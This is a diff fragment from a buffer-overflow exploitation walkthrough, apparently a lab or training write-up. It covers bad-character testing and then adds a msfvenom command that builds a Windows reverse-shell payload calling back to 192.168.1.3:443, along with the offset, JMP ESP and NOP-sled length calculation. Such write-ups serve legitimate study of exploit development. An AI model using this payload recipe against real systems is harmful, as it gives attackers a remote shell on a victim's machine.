@@ -181,4 +181,8 @@ as you can see after last `C` the string was truncated , if I removed `"\x00"` f
 ![Screen Shot 2021-08-26 at 2 09 25 PM](https://user-images.githubusercontent.com/47929033/130960229-6324294c-e7ef-4ed1-9035-1cf3fbb5d8f1.png)
 
 as you can see the string are in the stack without any truncated from `"\x01\x02"` to `"\xff"`: 
-there is no any other badchar in string only `"\x00"` is NullByte now we need to create shellcode with msfvenom to gaining access on system :
+there is no any other badchar in string only `"\x00"` is NullByte now we need to create shellcode with msfvenom to gaining access on system using command: 
+
+`msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=192.168.1.3 LPORT=443  -b "\x00"  -f c`
+but we have a problem total length = 600 - and service crashed after `524 bytes + JMP esp address` 
+we don't have space to shellcode we can try to ad 100 bytes of `NOPS` --> `\x90` and then shellocde then the total lenght = `524 + 4 + 100 + 351 =  979`, then exploit:  
